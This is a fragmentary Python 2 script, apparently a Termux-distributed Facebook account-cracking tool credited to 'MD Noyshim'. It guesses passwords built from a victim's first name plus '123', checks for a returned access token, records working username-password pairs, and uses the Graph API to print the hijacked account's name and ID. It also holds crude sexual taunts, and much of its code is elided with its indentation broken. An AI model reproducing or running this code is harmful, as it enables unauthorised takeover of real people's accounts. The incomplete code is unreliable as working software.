#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To MD Noyshim
...
\033[1;91m [⚡\033[1;97mAuthor Name: MD Noyshim     ⚡\033[1;91m]
\033[1;91m [⚡\033[1;97mYutube Chnl: Noyshim Teach Termux ⚡\033[1;91m]
...
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Fuck Your Gf \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(0.1)
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            print "\033[1;93mFUCK Password"
            os.system('xdg-open https://youtube.com/@noyshimtech-termux ')
    else:
		...
		try:													
			...
			if 'access_token' in q:
				...
				oks.append(user+pass1)
				    ...
				    print '\x1b[1;93m[ * ] \x1b[1;96m[Noyshim Checkpoint]'
				    ...
				    pass2 = b['first_name'] + '123'										
			            ...
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;91m[  *  ] \x1b[1;92mNoyshim [OK]'											
				            print '\x1b[1;91m[۩۞۩] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				            print '\x1b[1;91m[۩۞۩] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user								
